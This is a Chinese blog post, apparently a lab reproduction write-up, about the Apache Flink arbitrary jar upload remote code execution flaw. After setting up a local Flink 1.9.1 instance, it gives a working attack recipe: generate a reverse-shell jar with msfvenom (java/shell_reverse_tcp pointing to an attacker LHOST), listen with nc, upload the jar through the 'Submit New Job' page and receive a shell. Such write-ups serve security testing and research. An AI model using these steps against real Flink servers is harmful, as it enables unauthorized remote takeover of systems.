---
title:  Apache Flink 任意 Jar 包上传致 RCE 漏洞复现
date: 2019-11-17 14:03:23
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - Apache Flink
    - RCE
    - 漏洞复现
---
# 0x00 漏洞概述
Flink核心是一个流式的数据流执行引擎，
其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。
基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务。
可部署在各种集群环境，对各种大小的数据规模进行快速计算。

# 0x01影响版本

**Apache Link < 1.9.1 (当前最新)**

# 0x02 漏洞复现
## 环境搭建
测试环境：

* win10
* Flink 1.9.1    
* java8


首先下载Apache Flink 1.9.1[Apache Flink 1.9.1](https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz%0A)

下载后解压，进入`bin`目录，运行`start-cluster.bat`批处理文件
然后访问`127.0.0.1:8081`即可

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141151.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141240.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117141414.png)

## 漏洞利用
### 生成payload

使用`msfvenom`生成payload，确保生成的`LHOST`地址靶机可以访问
生成的`jar`包名字随意

`msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar >test.jar`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117142803.png)

### 开始监听
使用`nc`监听端口

`nc -lvvp 9999`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143145.png)

### 上传payload

在`Submit New Job`处点击`+ Add New`上传rec.jar文件

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143440.png)

点击名称展开，然后点击`Submit`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117143618.png)


### 反弹shell

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191117151631.png)

# 参考文章

[Apache Flink 任意 Jar 包上传致 RCE 漏洞复现](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483983&idx=1&sn=3dfebb1f2289549a71e821dd977ea3dc)
[Apache Flink远程代码执行预警](https://mp.weixin.qq.com/s?__biz=Mzg4NTA0MDg2MA==&mid=2247483956&idx=1&sn=fa18ba01ba064d4fc6b821de46274f90)
